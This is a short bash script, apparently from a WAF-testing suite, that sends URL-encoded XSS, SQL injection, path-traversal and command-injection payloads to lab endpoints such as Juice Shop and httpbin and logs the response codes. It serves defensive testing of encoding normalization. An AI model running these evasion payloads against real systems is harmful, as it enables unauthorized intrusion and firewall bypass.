#!/bin/bash
# URL encoding evasion: single, double, and triple encoding
# Tests whether WAF normalizes URL-encoded payloads before inspection
# Estimated duration: 1-2 minutes
set -euo pipefail

TARGET="${1:?Usage: 01-url-encoding.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] URL Encoding Evasion against ${TARGET}"
echo ""

declare -A PAYLOADS=(
  ["single-xss"]="%3Cscript%3Ealert(1)%3C%2Fscript%3E"
  ["double-xss"]="%253Cscript%253Ealert(1)%253C%252Fscript%253E"
  ["triple-xss"]="%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E"
  ["single-sqli"]="%27%20OR%201%3D1%20--%20"
  ["double-sqli"]="%2527%2520OR%25201%253D1%2520--%2520"
  ["single-traversal"]="..%2F..%2F..%2Fetc%2Fpasswd"
  ["double-traversal"]="%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
  ["triple-traversal"]="%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd"
  ["single-cmd-inject"]="%3Bls%20-la"
  ["double-cmd-inject"]="%253Bls%2520-la"
)

ENDPOINTS=(
  "/juice-shop/rest/products/search?q="
  "/?q="
  "/httpbin/get?q="
  "/httpbin/get?query="
)

for name in $(echo "${!PAYLOADS[@]}" | tr ' ' '\n' | sort); do
  payload="${PAYLOADS[$name]}"
  echo "[+] ${name}: ${payload}"
  for ep in "${ENDPOINTS[@]}"; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
      "${BASE}${ep}${payload}" --max-time 10) || code="ERR"
    printf "    %-40s -> HTTP %s\n" "${ep}" "${code}"
  done
  echo ""
done

echo "[*] URL encoding evasion complete"
